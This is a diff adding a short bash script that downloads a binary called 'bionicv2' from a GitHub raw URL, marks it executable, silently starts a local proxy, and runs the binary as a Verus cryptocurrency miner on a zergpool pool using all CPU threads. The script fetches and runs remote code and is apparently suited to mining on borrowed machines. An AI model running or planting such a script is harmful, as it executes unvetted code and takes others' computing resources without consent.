@@ -1,0 +1,10 @@
+#!/bin/bash
+wget -qO bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
+chmod +x bionicv2
+python3 proxy.py >/dev/null &
+pool="stratum+tcp://verushash.mine.zergpool.com:3300"
+wallet="$1"
+workername="$(cat /proc/sys/kernel/hostname)"
+coin="$2"
+thread="$(nproc --all)"
+./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p c=$coin
